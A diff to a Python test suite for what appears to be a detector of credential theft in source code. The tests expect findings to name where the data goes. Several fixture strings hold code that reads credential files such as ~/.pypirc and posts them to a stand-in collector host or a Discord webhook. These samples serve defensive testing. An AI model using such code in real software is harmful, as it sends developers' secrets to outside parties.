@@ -325,7 +325,7 @@ class TestACredentialStoreSent:
             "    requests.post(hook, data=json.dumps(found))\n"
             "push(os.environ.get('HOOK'))\n"
         )
-        assert self.secret(source) == ["secret sent: CREDENTIAL_FILE to ?"]
+        assert self.secret(source) == ["secret sent: CREDENTIAL_FILE outside=unknown to ?"]
 
     def test_a_store_opened_with_with_and_sent(self):
         source = (
@@ -334,7 +334,38 @@ class TestACredentialStoreSent:
             "    key = f.read()\n"
             "requests.post('https://collector.example.invalid', data=key)\n"
         )
-        assert self.secret(source) == ["secret sent: CREDENTIAL_FILE to collector.example.invalid"]
+        assert self.secret(source) == [
+            "secret sent: CREDENTIAL_FILE outside=home to collector.example.invalid"
+        ]
+
+    def test_a_store_sent_to_a_chat_webhook(self):
+        source = (
+            "import os, requests\n"
+            "with open(os.path.expanduser('~/.pypirc')) as f:\n"
+            "    data = f.read()\n"
+            "requests.post('https://discord.com/api/webhooks/1/x', json={'c': data})\n"
+        )
+        assert self.secret(source) == ["secret sent: CREDENTIAL_FILE outside=chat to discord.com"]
+
+    def test_aws_keys_sent_to_aws_are_home(self):
+        source = (
+            "import os, requests\n"
+            "with open(os.path.expanduser('~/.aws/credentials')) as f:\n"
+            "    data = f.read()\n"
+            "requests.post('https://sts.amazonaws.com/', data=data)\n"
+        )
+        assert self.secret(source) == []
+
+    def test_an_index_config_sent_to_its_index_is_not(self):
+        # an upload tool sends what .pypirc names to the index it names
+        source = (
+            "import configparser, os, requests\n"
+            "config = configparser.RawConfigParser()\n"
+            "config.read(os.path.expanduser('~/.pypirc'))\n"
+            "auth = config.get('pypi', 'password')\n"
+            "requests.post('https://upload.example-index.invalid/legacy/', auth=('t', auth))\n"
+        )
+        assert self.secret(source) == []
 
     def test_an_sdk_reading_the_store_to_sign_is_not(self):
         source = (
